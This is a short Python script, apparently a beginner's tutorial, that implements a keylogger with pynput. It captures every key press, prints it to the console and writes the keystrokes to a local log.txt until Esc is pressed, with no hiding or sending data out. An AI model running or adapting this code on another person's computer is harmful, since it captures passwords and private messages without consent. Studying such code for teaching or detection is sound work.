import pynput
from pynput.keyboard import Key,Listener

count=0; #counts the number of type made
keys=[]; #python list definition for storing keys

#stores the pressed key to a list and show the key pressed to user
def on_press(key):
    global count
    global keys
    keys.append(key); #append the pressed to the list
    print('{0} is pressed'.format(key)); #show the keys to user
    write_files(keys);

#this function returns or ends the keylogger if escape key is pressed
def on_release(key):
    if key ==Key.esc:
        return False;

def write_files(keys): #function definition
    file=open('log.txt','w'); #open file for writing
    for key in keys:
        k=str(key).replace("'",''); #replace ' with space
        if k.find('space') >0: #if we find space in a string
            file.write('\n'); #write a new line in file
        elif k.find('Key') == -1: #if Key exist
            file.write(k); #write
with Listener(on_press=on_press,on_release=on_release) as listen:
    listen.join(); #loop continiously


